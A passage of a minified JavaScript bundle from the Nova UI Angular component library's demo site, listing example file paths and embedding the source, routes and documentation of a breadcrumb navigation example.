izes.example.component.html","spinner/spinner-sizes/spinner-sizes.example.component.ts","spinner/spinner-test/spinner-test.html","spinner/spinner-test/spinner-test.ts","spinner/spinner-visual-test/spinner-visual-test.component.html","spinner/spinner-visual-test/spinner-visual-test.component.ts","spinner/spinner-with-cancel/spinner-with-cancel.example.component.html","spinner/spinner-with-cancel/spinner-with-cancel.example.component.ts","spinner/spinner-with-delay-toggle/spinner-with-delay-toggle.example.component.html","spinner/spinner-with-delay-toggle/spinner-with-delay-toggle.example.component.ts","spinner/spinner-with-text/spinner-with-text.example.component.html","spinner/spinner-with-text/spinner-with-text.example.component.ts","spinner/spinner.module.ts","switch/index.ts","switch/switch-disable/switch-disable.example.component.html","switch/switch-disable/switch-disable.example.component.ts","switch/switch-docs/switch-docs.example.component.html","switch/switch-docs/switch-docs.example.component.ts","switch/switch-simple/switch-simple.example.component.html","switch/switch-simple/switch-simple.example.component.ts","switch/switch-test/switch-test.component.html","switch/switch-test/switch-test.component.ts","switch/switch-value-change/switch-value-change.example.component.html","switch/switch-value-change/switch-value-change.example.component.ts","switch/switch-visual-test/switch-visual-test.component.html","switch/switch-visual-test/switch-visual-test.component.ts","switch/switch.module.ts","tabgroup/index.ts","tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.html","tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.less","tabgroup/tab-heading-group-dynamic/tab-heading-group-dynamic.example.component.ts","tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.html","tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.less","tabgroup/tab-heading-group-horizontal/tab-heading-group-horizontal.example.component.ts","tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.html","tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.less","tabgroup/tab-heading-group-horizontal-with-icons/tab-heading-group-horizontal-with-icons.example.component.ts","tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.html","tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.less","tabgroup/tab-heading-group-horizontal-with-icons-only/tab-heading-group-horizontal-with-icons-only.example.component.ts","tabgroup/tab-heading-group-responsive/tab-heading-group-responsive.example.component.html","tabgroup/tab-heading-group-responsive/tab-heading-group-responsive.example.component.ts","tabgroup/tab-heading-group-test/tab-heading-group-test.component.html","tabgroup/tab-heading-group-test/tab-heading-group-test.component.ts","tabgroup/tab-heading-group-vertical/tab-heading-group-vertical.example.component.html","tabgroup/tab-heading-group-vertical/tab-heading-group-vertical.example.component.ts","tabgroup/tab-heading-group-vertical-with-icons/tab-heading-group-vertical-with-icons.example.component.html","tabgroup/tab-heading-group-vertical-with-icons/tab-heading-group-vertical-with-icons.example.component.ts","tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.html","tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.less","tabgroup/tab-heading-group-with-content/tab-heading-group-with-content.example.component.ts","tabgroup/tab-heading-group-with-icons/tab-heading-group-with-icons.example.component.html","tabgroup/tab-heading-group-with-icons/tab-heading-group-with-icons.example.component.ts","tabgroup/tab-heading-group-with-router/routes.ts","tabgroup/tab-heading-group-with-router/tab-content/about/tab-content-about.example.component.html","tabgroup/tab-heading-group-with-router/tab-content/about/tab-content-about.example.component.ts","tabgroup/tab-heading-group-with-router/tab-content/settings/tab-content-settings.example.component.html","tabgroup/tab-heading-group-with-router/tab-content/settings/tab-content-settings.example.component.ts","tabgroup/tab-heading-group-with-router/tab-content/statistics/tab-content-statistics.example.component.html","tabgroup/tab-heading-group-with-router/tab-content/statistics/tab-content-statistics.example.component.ts","tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.html","tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.less","tabgroup/tab-heading-group-with-router/tab-heading-group-with-router.example.component.ts","tabgroup/tabgroup-docs/tabgroup-docs.example.component.html","tabgroup/tabgroup-docs/tabgroup-docs.example.component.ts","tabgroup/tabgroup.module.ts","table/index.ts","table/table-basic/table-basic.example.component.html","table/table-basic/table-basic.example.component.less","table/table-basic/table-basic.example.component.ts","table/table-cell-content-align/table-cell-content-align.example.component.html","table/table-cell-content-align/table-cell-content-align.example.component.less","table/table-cell-content-align/table-cell-content-align.example.component.ts","table/table-cell-width-set/table-cell-width-set.example.component.html","table/table-cell-width-set/table-cell-width-set.example.component.ts","table/table-columns-add-remove/table-columns-add-remove.example.component.html","table/table-columns-add-remove/table-columns-add-remove.example.component.less","table/table-columns-add-remove/table-columns-add-remove.example.component.ts","table/table-docs/table-docs.example.component.html","table/table-docs/table-docs.example.component.ts","table/table-pagination/table-pagination.example.component.html","table/table-pagination/table-pagination.example.component.ts","table/table-pinned-header/table-pinned-header.example.component.html","table/table-pinned-header/table-pinned-header.example.component.less","table/table-pinned-header/table-pinned-header.example.component.ts","table/table-reorder/table-reorder.example.component.html","table/table-reorder/table-reorder.example.component.less","table/table-reorder/table-reorder.example.component.ts","table/table-resize/table-resize.example.component.html","table/table-resize/table-resize.example.component.ts","table/table-row-clickable/table-row-clickable.example.component.html","table/table-row-clickable/table-row-clickable.example.component.ts","table/table-row-height-set/table-row-height-set.example.component.html","table/table-row-height-set/table-row-height-set.example.component.less","table/table-row-height-set/table-row-height-set.example.component.ts","table/table-search/table-search.example.component.html","table/table-search/table-search.example.component.less","table/table-search/table-search.example.component.ts","table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.html","table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.less","table/table-search-with-select-and-pagination/table-search-with-select-and-pagination.example.component.ts","table/table-select/table-select.example.component.html","table/table-select/table-select.example.component.ts","table/table-select-pinned-header/table-select-pinned-header.example.component.html","table/table-select-pinned-header/table-select-pinned-header.example.component.less","table/table-select-pinned-header/table-select-pinned-header.example.component.ts","table/table-selectable-toggle/table-selectable-toggle.example.component.html","table/table-selectable-toggle/table-selectable-toggle.example.component.ts","table/table-sorting/table-sorting.example.component.html","table/table-sorting/table-sorting.example.component.ts","table/table-test/table-test-data-source.ts","table/table-test/table-test.component.html","table/table-test/table-test.component.ts","table/table-virtual-scroll-datasource-1.ts","table/table-virtual-scroll-datasource.ts","table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.html","table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.less","table/table-virtual-scroll-real-api/table-virtual-scroll-real-api.example.component.ts","table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.html","table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.less","table/table-virtual-scroll-real-api-minimalist/table-virtual-scroll-real-api-minimalist.example.component.ts","table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.html","table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.less","table/table-virtual-scroll-real-api-progress-footer/table-virtual-scroll-real-api-progress-footer.example.component.ts","table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.html","table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.less","table/table-virtual-scroll-real-api-progress-text-footer/table-virtual-scroll-real-api-progress-text-footer.example.component.ts","table/table-virtual-scroll-select-sticky-header/table-virtual-scroll-select-sticky-header-example.component.html","table/table-virtual-scroll-select-sticky-header/table-virtual-scroll-select-sticky-header-example.component.ts","table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.html","table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.less","table/table-virtual-scroll-steps-and-button/table-virtual-scroll-steps-and-button.example.component.ts","table/table-virtual-scroll-sticky-header/table-virtual-scroll-sticky-header-example.component.html","table/table-virtual-scroll-sticky-header/table-virtual-scroll-sticky-header-example.component.ts","table/table-virtual-scroll-sticky-header-test/table-virtual-scroll-sticky-header-test-example.component.html","table/table-virtual-scroll-sticky-header-test/table-virtual-scroll-sticky-header-test-example.component.ts","table/table-visual-test/table-visual-test.example.html","table/table-visual-test/table-visual-test.example.ts","table/table.module.ts","textbox/index.ts","textbox/textbox-area/textbox-area.example.component.html","textbox/textbox-area/textbox-area.example.component.ts","textbox/textbox-basic/textbox-basic.example.component.html","textbox/textbox-basic/textbox-basic.example.component.ts","textbox/textbox-custom-width/textbox-custom-width.example.component.html","textbox/textbox-custom-width/textbox-custom-width.example.component.ts","textbox/textbox-disabled/textbox-disabled.example.component.html","textbox/textbox-disabled/textbox-disabled.example.ts","textbox/textbox-docs/textbox-docs.example.component.html","textbox/textbox-docs/textbox-docs.example.component.ts","textbox/textbox-getting-value/textbox-getting-value.example.component.html","textbox/textbox-getting-value/textbox-getting-value.example.component.ts","textbox/textbox-hint/textbox-hint.example.component.html","textbox/textbox-hint/textbox-hint.example.component.ts","textbox/textbox-info/textbox-info.example.component.html","textbox/textbox-info/textbox-info.example.component.ts","textbox/textbox-number/index.ts","textbox/textbox-number/textbox-number-basic/textbox-number-basic.example.component.html","textbox/textbox-number/textbox-number-basic/textbox-number-basic.example.component.ts","textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.html","textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.less","textbox/textbox-number/textbox-number-docs/textbox-number-docs.example.component.ts","textbox/textbox-number/textbox-number-min-max/textbox-number-min-max.example.component.html","textbox/textbox-number/textbox-number-min-max/textbox-number-min-max.example.component.ts","textbox/textbox-number/textbox-number-test/textbox-number-test.component.html","textbox/textbox-number/textbox-number-test/textbox-number-test.component.ts","textbox/textbox-number/textbox-number-visual-test/textbox-number-visual-test.component.html","textbox/textbox-number/textbox-number-visual-test/textbox-number-visual-test.component.ts","textbox/textbox-placeholder/textbox-placeholder.example.component.html","textbox/textbox-placeholder/textbox-placeholder.example.component.ts","textbox/textbox-readonly/textbox-readonly.example.component.html","textbox/textbox-readonly/textbox-readonly.example.component.ts","textbox/textbox-required/textbox-required.example.component.html","textbox/textbox-required/textbox-required.example.component.ts","textbox/textbox-visual-test/textbox-visual-test.component.html","textbox/textbox-visual-test/textbox-visual-test.component.ts","textbox/textbox.module.ts","theming/custom-theme/custom-theme.example.component.html","theming/custom-theme/custom-theme.example.component.less","theming/custom-theme/custom-theme.example.component.ts","theming/theme-switch-service/theme-switch-service.example.component.html","theming/theme-switch-service/theme-switch-service.example.component.ts","theming/theming-docs/theming-docs.example.component.html","theming/theming-docs/theming-docs.example.component.less","theming/theming-docs/theming-docs.example.component.ts","theming/theming.module.ts","time-frame-picker/index.ts","time-frame-picker/quick-picker-basic/quick-picker-basic.example.component.html","time-frame-picker/quick-picker-basic/quick-picker-basic.example.component.ts","time-frame-picker/time-frame-picker-basic/time-frame-picker-basic.example.component.html","time-frame-picker/time-frame-picker-basic/time-frame-picker-basic.example.component.ts","time-frame-picker/time-frame-picker-custom/time-frame-picker-custom.example.component.html","time-frame-picker/time-frame-picker-custom/time-frame-picker-custom.example.component.ts","time-frame-picker/time-frame-picker-date/time-frame-picker-date.example.component.html","time-frame-picker/time-frame-picker-date/time-frame-picker-date.example.component.ts","time-frame-picker/time-frame-picker-docs/time-frame-picker-docs.example.component.html","time-frame-picker/time-frame-picker-docs/time-frame-picker-docs.example.component.ts","time-frame-picker/time-frame-picker-inline/time-frame-picker-inline.example.component.html","time-frame-picker/time-frame-picker-inline/time-frame-picker-inline.example.component.ts","time-frame-picker/time-frame-picker-multiple-custom-pickers/time-frame-picker-multiple-custom-pickers.example.component.html","time-frame-picker/time-frame-picker-multiple-custom-pickers/time-frame-picker-multiple-custom-pickers.example.component.ts","time-frame-picker/time-frame-picker-test/time-frame-picker-test.example.component.html","time-frame-picker/time-frame-picker-test/time-frame-picker-test.example.component.ts","time-frame-picker/time-frame-picker-visual-test/time-frame-picker-visual-test.component.html","time-frame-picker/time-frame-picker-visual-test/time-frame-picker-visual-test.component.ts","time-frame-picker/time-frame-picker.module.ts","time-picker/index.ts","time-picker/time-picker-basic/time-picker-basic.example.component.html","time-picker/time-picker-basic/time-picker-basic.example.component.ts","time-picker/time-picker-custom-format/time-picker-custom-format.example.component.html","time-picker/time-picker-custom-format/time-picker-custom-format.example.component.ts","time-picker/time-picker-custom-step/time-picker-custom-step.example.component.html","time-picker/time-picker-custom-step/time-picker-custom-step.example.component.ts","time-picker/time-picker-disabled/time-picker-disabled.example.component.html","time-picker/time-picker-disabled/time-picker-disabled.example.component.ts","time-picker/time-picker-docs/time-picker-docs.example.component.html","time-picker/time-picker-docs/time-picker-docs.example.component.ts","time-picker/time-picker-localized/time-picker-localized.example.component.html","time-picker/time-picker-localized/time-picker-localized.example.component.ts","time-picker/time-picker-model-change/time-picker-model-change.example.component.html","time-picker/time-picker-model-change/time-picker-model-change.example.component.ts","time-picker/time-picker-preserve-isignificant/time-picker-preserve-insignificant.example.component.html","time-picker/time-picker-preserve-isignificant/time-picker-preserve-insignificant.example.component.ts","time-picker/time-picker-reactive-form/time-picker-reactive-form.example.component.html","time-picker/time-picker-reactive-form/time-picker-reactive-form.example.component.ts","time-picker/time-picker-visual-test/time-picker-visual-test.component.html","time-picker/time-picker-visual-test/time-picker-visual-test.component.ts","time-picker/time-picker.module.ts","toast/index.ts","toast/toast-basic/toast-basic.example.component.html","toast/toast-basic/toast-basic.example.component.ts","toast/toast-basic-html/toast-basic-html.example.component.html","toast/toast-basic-html/toast-basic-html.example.component.ts","toast/toast-config/toast-config.example.component.html","toast/toast-config/toast-config.example.component.ts","toast/toast-docs/toast-docs.example.component.html","toast/toast-docs/toast-docs.example.component.ts","toast/toast-events/toast-events.example.component.html","toast/toast-events/toast-events.example.component.ts","toast/toast-position/toast-position.example.component.html","toast/toast-position/toast-position.example.component.ts","toast/toast-sticky-error/toast-sticky-error.example.component.html","toast/toast-sticky-error/toast-sticky-error.example.component.ts","toast/toast-test/toast-test.component.html","toast/toast-test/toast-test.component.ts","toast/toast-type/toast-type.example.component.html","toast/toast-type/toast-type.example.component.ts","toast/toast-visual-test/toast-visual-test.component.html","toast/toast-visual-test/toast-visual-test.component.ts","toast/toast.module.ts","toolbar/index.ts","toolbar/toolbar-basic/toolbar-basic.example.component.html","toolbar/toolbar-basic/toolbar-basic.example.component.ts","toolbar/toolbar-docs/toolbar-docs.example.component.html","toolbar/toolbar-docs/toolbar-docs.example.component.ts","toolbar/toolbar-embedded-content/toolbar-embedded-content.example.component.html","toolbar/toolbar-embedded-content/toolbar-embedded-content.example.component.ts","toolbar/toolbar-item-types/toolbar-item-types.example.component.html","toolbar/toolbar-item-types/toolbar-item-types.example.component.ts","toolbar/toolbar-selection/toolbar-selection.example.component.html","toolbar/toolbar-selection/toolbar-selection.example.component.ts","toolbar/toolbar-test/toolbar-test.component.html","toolbar/toolbar-test/toolbar-test.component.ts","toolbar/toolbar-visual-test/toolbar-visual-test.component.html","toolbar/toolbar-visual-test/toolbar-visual-test.component.ts","toolbar/toolbar.module.ts","tooltip/index.ts","tooltip/tooltip-basic/tooltip-basic.example.component.html","tooltip/tooltip-basic/tooltip-basic.example.component.ts","tooltip/tooltip-disabled/tooltip-disabled.example.component.html","tooltip/tooltip-disabled/tooltip-disabled.example.component.ts","tooltip/tooltip-docs/tooltip-docs.example.component.html","tooltip/tooltip-docs/tooltip-docs.example.component.ts","tooltip/tooltip-ellipsis/tooltip-ellipsis.example.component.html","tooltip/tooltip-ellipsis/tooltip-ellipsis.example.component.ts","tooltip/tooltip-position/tooltip-position.example.component.html","tooltip/tooltip-position/tooltip-position.example.component.less","tooltip/tooltip-position/tooltip-position.example.component.ts","tooltip/tooltip-trigger/tooltip-trigger.example.component.html","tooltip/tooltip-trigger/tooltip-trigger.example.component.ts","tooltip/tooltip-visual-test/tooltip-visual-test.component.html","tooltip/tooltip-visual-test/tooltip-visual-test.component.ts","tooltip/tooltip.module.ts","wizard/index.ts","wizard/wizard-additional-button/wizard-additional-button.example.component.html","wizard/wizard-additional-button/wizard-additional-button.example.component.ts","wizard/wizard-busy/wizard-busy.example.component.html","wizard/wizard-busy/wizard-busy.example.component.ts","wizard/wizard-confirmation-dialog/wizard-confirmation-dialog.example.component.html","wizard/wizard-confirmation-dialog/wizard-confirmation-dialog.example.component.ts","wizard/wizard-constant-height/wizard-constant-height.example.component.html","wizard/wizard-constant-height/wizard-constant-height.example.component.ts","wizard/wizard-custom-step-line-width/wizard-custom-step-line-width.example.component.html","wizard/wizard-custom-step-line-width/wizard-custom-step-line-width.example.component.ts","wizard/wizard-dialog/wizard-dialog.example.component.html","wizard/wizard-dialog/wizard-dialog.example.component.ts","wizard/wizard-disabled/wizard-disabled.example.component.html","wizard/wizard-disabled/wizard-disabled.example.component.ts","wizard/wizard-docs/wizard-docs.example.component.html","wizard/wizard-docs/wizard-docs.example.component.ts","wizard/wizard-dynamic/wizard-dynamic.example.component.html","wizard/wizard-dynamic/wizard-dynamic.example.component.ts","wizard/wizard-dynamic-remove/wizard-dynamic-remove.example.component.html","wizard/wizard-dynamic-remove/wizard-dynamic-remove.example.component.ts","wizard/wizard-hide/wizard-hide.example.component.html","wizard/wizard-hide/wizard-hide.example.component.ts","wizard/wizard-reset-step/wizard-reset-step-example.component.ts","wizard/wizard-reset-step/wizard-reset-step.example.component.html","wizard/wizard-simple/wizard-simple.example.component.html","wizard/wizard-simple/wizard-simple.example.component.ts","wizard/wizard-steps/wizard-steps.example.component.html","wizard/wizard-steps/wizard-steps.example.component.ts","wizard/wizard-validation/wizard-validation.example.component.html","wizard/wizard-validation/wizard-validation.example.component.ts","wizard/wizard-visual-test/wizard-visual-test.component.html","wizard/wizard-visual-test/wizard-visual-test.component.ts","wizard/wizard-with-separate-step-headings/wizard-with-separate-step-headings.example.component.html","wizard/wizard-with-separate-step-headings/wizard-with-separate-step-headings.example.component.ts","wizard/wizard.module.ts","wizard-v2/index.ts","wizard-v2/wizard-async-validation-form/wizard-async-form-validation.example.component.html","wizard-v2/wizard-async-validation-form/wizard-async-form-validation.example.component.ts","wizard-v2/wizard-busy/wizard-busy.example.component.html","wizard-v2/wizard-busy/wizard-busy.example.component.less","wizard-v2/wizard-busy/wizard-busy.example.component.ts","wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.html","wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.less","wizard-v2/wizard-custom-footer/wizard-custom-footer.example.component.ts","wizard-v2/wizard-custom-layout/wizard-custom.component.html","wizard-v2/wizard-custom-layout/wizard-custom.component.less","wizard-v2/wizard-custom-layout/wizard-custom.example.component.html","wizard-v2/wizard-custom-layout/wizard-custom.example.component.ts","wizard-v2/wizard-dialog/wizard-dialog.example.component.html","wizard-v2/wizard-dialog/wizard-dialog.example.component.less","wizard-v2/wizard-dialog/wizard-dialog.example.component.ts","wizard-v2/wizard-docs/wizard-docs.component.html","wizard-v2/wizard-docs/wizard-docs.component.ts","wizard-v2/wizard-dynamic/wizard-dynamic.example.component.html","wizard-v2/wizard-dynamic/wizard-dynamic.example.component.ts","wizard-v2/wizard-horizontal/wizard-horizontal.example.component.html","wizard-v2/wizard-horizontal/wizard-horizontal.example.component.ts","wizard-v2/wizard-remove-step/wizard-remove-step.example.component.html","wizard-v2/wizard-remove-step/wizard-remove-step.example.component.ts","wizard-v2/wizard-responsive-header/wizard-responsive-header.example.component.html","wizard-v2/wizard-responsive-header/wizard-responsive-header.example.component.ts","wizard-v2/wizard-restore-state/wizard-restore-state.example.component.html","wizard-v2/wizard-restore-state/wizard-restore-state.example.component.less","wizard-v2/wizard-restore-state/wizard-restore-state.example.component.ts","wizard-v2/wizard-step-change/wizard-step-change.example.component.html","wizard-v2/wizard-step-change/wizard-step-change.example.component.ts","wizard-v2/wizard-test/wizard-test.component.html","wizard-v2/wizard-test/wizard-test.component.ts","wizard-v2/wizard-test/wizard-test.less","wizard-v2/wizard-tooltip/wizard-tooltip.example.component.html","wizard-v2/wizard-tooltip/wizard-tooltip.example.component.ts","wizard-v2/wizard-v2.module.ts","wizard-v2/wizard-vertical-layout/wizard-vertical.example.component.html","wizard-v2/wizard-vertical-layout/wizard-vertical.example.component.ts","wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.html","wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.less","wizard-v2/wizard-with-confirmation-dialog-on-cancel/wizard-with-confirmation-dialog-on-cancel.example.component.ts","wizard-v2/wizard-with-custom-icons/wizard-with-custom-icons.example.component.html","wizard-v2/wizard-with-custom-icons/wizard-with-custom-icons.example.component.ts"],a=s=>({context:s,files:t.filter(i=>i.includes(s)).map(i=>({content:e(2462)(`./${i}`).default,path:i})).concat({content:e(8677).A,path:"package.json"})})},15370:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-breadcrumb\n    id="nui-demo-breadcrumb-basic"\n    [items]="breadcrumbSource"\n    (navigation)="onNavigation($event)"\n></nui-breadcrumb>\n<div class="container">\n    <div i18n class="nui-text-default">\n        Sed ut perspiciatis, unde omnis iste natus error sit voluptatem\n        accusantium doloremque laudantium, totam rem aperiam eaque ipsa, quae ab\n        illo inventore veritatis et quasi architecto beatae vitae dicta sunt,\n        explicabo. Nemo enim ipsam voluptatem, quia voluptas sit, aspernatur aut\n        odit aut fugit, sed quia consequuntur magni dolores eos, qui ratione\n        voluptatem sequi nesciunt, neque porro quisquam est, qui dolorem ipsum,\n        quia dolor sit, amet, consectetur, adipisci velit, sed quia non numquam\n        eius modi tempora incidunt, ut labore et dolore magnam aliquam quaerat\n        voluptatem.\n    </div>\n    <button\n        id="nui-demo-breadcrumb-show-countries"\n        nui-button\n        type="button"\n        (click)="relativeNavigation(\'countries\')"\n        i18n\n    >\n        Show countries\n    </button>\n    <button\n        id="nui-demo-breadcrumb-show-offices"\n        nui-button\n        class="ml-1"\n        type="button"\n        (click)="relativeNavigation(\'offices\')"\n        i18n\n    >\n        Show offices\n    </button>\n    <router-outlet></router-outlet>\n</div>\n'},88854:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component, OnDestroy, OnInit } from "@angular/core";\nimport { ActivatedRoute, Router } from "@angular/router";\nimport { Subscription } from "rxjs";\n\nimport { BreadcrumbItem, BreadcrumbStateService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-breadcrumb-basic-example",\n    templateUrl: "./breadcrumb-basic.example.component.html",\n})\nexport class BreadcrumbBasicExampleComponent implements OnInit, OnDestroy {\n    public breadcrumbSource: Array<BreadcrumbItem>;\n    private routerSubscription: Subscription;\n\n    constructor(\n        private router: Router,\n        private routerState: ActivatedRoute,\n        private breadcrumbStateService: BreadcrumbStateService\n    ) {}\n\n    public ngOnInit(): void {\n        this.breadcrumbSource = this.breadcrumbStateService.getBreadcrumbState(\n            this.routerState,\n            "/breadcrumb/"\n        );\n        this.routerSubscription = this.breadcrumbStateService\n            .getNavigationSubscription(this.router)\n            .subscribe(\n                () =>\n                    (this.breadcrumbSource =\n                        this.breadcrumbStateService.getBreadcrumbState(\n                            this.routerState,\n                            "/breadcrumb/"\n                        ))\n            );\n    }\n\n    public onNavigation(routerState: string): void {\n        void this.router.navigate([routerState]);\n    }\n\n    public relativeNavigation(routerState: string): void {\n        void this.router.navigate([routerState], {\n            relativeTo: this.routerState,\n        });\n    }\n\n    public ngOnDestroy(): void {\n        this.routerSubscription.unsubscribe();\n    }\n}\n\n@Component({\n    selector: "nui-breadcrumb-first-subview",\n    template: ` <div class="container">\n        <div i18n class="nui-text-default">\n            Et harum quidem rerum facilis est et expedita distinctio. Nam libero\n            tempore, cum soluta nobis est eligendi optio, cumque nihil impedit,\n            quo minus id, quod maxime placeat, facere possimus, omnis voluptas\n            assumenda est, omnis dolor repellendus. Temporibus autem quibusdam\n            et aut officiis debitis aut rerum necessitatibus saepe eveniet, ut\n            et voluptates repudiandae sint et molestiae non recusandae. Itaque\n            earum rerum hic tenetur a sapiente delectus, ut aut reiciendis\n            voluptatibus maiores alias consequatur aut perferendis doloribus\n            asperiores repellat.\n        </div>\n        <button\n            id="nui-demo-breadcrumb-show-first-country"\n            nui-button\n            type="button"\n            (click)="relativeNavigation(\'usa\')"\n            i18n\n        >\n            USA\n        </button>\n        <button\n            id="nui-demo-breadcrumb-show-second-country"\n            class="ml-1"\n            nui-button\n            type="button"\n            (click)="relativeNavigation(\'ukraine\')"\n            i18n\n        >\n            Ukraine\n        </button>\n        <router-outlet></router-outlet>\n    </div>`,\n})\nexport class BreadcrumbCountriesSubviewComponent {\n    constructor(private router: Router, private routerState: ActivatedRoute) {}\n\n    public relativeNavigation(routerState: string): void {\n        this.router.navigate([routerState], { relativeTo: this.routerState });\n    }\n}\n\n@Component({\n    selector: "nui-breadcrumb-second-subview",\n    template: ` <div>\n        <p i18n class="nui-text-default">Some data about country here</p>\n    </div>`,\n})\nexport class BreadcrumbSingleCountryComponent {}\n\n@Component({\n    selector: "nui-breadcrumb-offices-subview",\n    template: ` <div>\n        <p i18n class="nui-text-default">Some data about offices here</p>\n    </div>`,\n})\nexport class BreadcrumbOfficesSubviewComponent {}\n'},40567:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='import {\n    BreadcrumbBasicExampleComponent,\n    BreadcrumbCountriesSubviewComponent,\n    BreadcrumbOfficesSubviewComponent,\n    BreadcrumbSingleCountryComponent,\n} from "./breadcrumb-basic.example.component";\n\nexport const ROUTES = [\n    {\n        path: "",\n        component: BreadcrumbBasicExampleComponent,\n        data: {\n            breadcrumb: "Root",\n            showThemeSwitcher: true,\n        },\n        children: [\n            {\n                path: "countries",\n                component: BreadcrumbCountriesSubviewComponent,\n                data: {\n                    breadcrumb: "Countries",\n                    url: "https://tesla.com",\n                    showThemeSwitcher: true,\n                },\n                children: [\n                    {\n                        path: "usa",\n                        component: BreadcrumbSingleCountryComponent,\n                        data: {\n                            breadcrumb: "USA",\n                            showThemeSwitcher: true,\n                        },\n                    },\n                    {\n                        path: "ukraine",\n                        component: BreadcrumbSingleCountryComponent,\n                        data: {\n                            breadcrumb: "Ukraine",\n                            showThemeSwitcher: true,\n                        },\n                    },\n                ],\n            },\n            {\n                path: "offices",\n                component: BreadcrumbOfficesSubviewComponent,\n                data: {\n                    breadcrumb: "Offices",\n                    showThemeSwitcher: true,\n                },\n            },\n        ],\n    },\n];\n'},36244:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<p>\n    The <code>&lt;nui-breadcrumb&gt;</code> component represents a structure of\n    nested items. Its state is based on data from each route that takes part in\n    this structure.\n</p>\n\n<h2>Required Modules</h2>\n<ul>\n    <li>\n        <code>NuiBreadcrumbModule</code>\n    </li>\n</ul>\n\n<h2>Basic Usage</h2>\n<p>To use breadcrumb do the following:</p>\n<ol>\n    <li>\n        Place an <code>&lt;nui-breadcrumb&gt;</code> in the template of a top\n        level component.\n    </li>\n    <li>\n        Configure a RoutingModule with a tree structure of routes similar to the\n        following:\n        <nui-example-code language="typescript">{{\n            routesExample\n        }}</nui-example-code>\n    </li>\n    <li>\n        Specify a <code>breadcrumb</code> item name in the\n        <code>route.data</code> object.\n    </li>\n    <li>\n        Optionally, specify a <code>url</code> - the external url for the\n        breadcrumb to navigate (using CTRL + Click, or simple Middle Click\n        events). This setting should also be in the\n        <code>route.data</code> object.<br />\n        <mark\n            >NOTE: regular left mouse click events will still navigate you using\n            the angular router.</mark\n        >\n    </li>\n    <li>\n        Get the initial data set for the breadcrumb via\n        <code\n            ><a\n                href="../injectables/BreadcrumbStateService.html"\n                target="_blank"\n            >\n                BreadcrumbStateService</a\n            >.getBreadcrumbState(routerState: ActivatedRoute)</code\n        >.\n    </li>\n    <li>\n        Subscribe to router changes using\n        <code\n            ><a\n                href="../injectables/BreadcrumbStateService.html"\n                target="_blank"\n            >\n                BreadcrumbStateService</a\n            >.getNavigationSubscription(router: Router)</code\n        >\n        and update input data for the <code>BreadcrumbComponent</code>.\n    </li>\n    <li>\n        To perform navigation via <code>&lt;nui-breadcrumb&gt;</code> component\n        items, subscribe to the <code>navigation</code>\n        output. The subscription event payload is an absolute route path that\n        can be used to trigger the navigation.\n    </li>\n</ol>\n<p>\n    In addition to the above, the following example also illustrates how to\n    perform a relative navigation.\n</p>\n<nui-example-wrapper\n    filenamePrefix="breadcrumb-basic"\n    exampleTitle="Basic Usage"\n>\n    